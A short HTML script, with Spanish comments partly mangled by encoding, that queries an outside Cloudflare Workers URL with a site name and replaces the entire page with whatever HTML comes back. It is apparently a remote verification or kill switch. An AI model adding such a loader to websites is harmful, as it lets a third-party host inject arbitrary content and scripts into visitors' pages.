<script>
    // Configuraci칩n
    const WORKER_URL = 'https://quiet-frog-4ad6.innovatools069.workers.dev/';
    const NOMBRE_SW = 'perfumeria667';
    
    // Verificaci칩n inmediata
    (async function() {
        try {
            // Solicitar verificaci칩n
            const response = await fetch(`${WORKER_URL}?nombre=${encodeURIComponent(NOMBRE_SW)}`);
            
            if (!response.ok) {
                throw new Error('Error en la solicitud');
            }
            
            // Obtener contenido
            const content = await response.text();
            
            // Si hay contenido HTML, reemplazar toda la p치gina
            if (content && content.trim() !== '') {
                document.open();
                document.write(content);
                document.close();
                return;
            }
            
            // Si no hay coincidencia
            document.getElementById('noMatch').style.display = 'block';
            
        } catch (error) {
            console.error('Error:', error);
            document.getElementById('noMatch').style.display = 'block';
        }
    })();
</script>
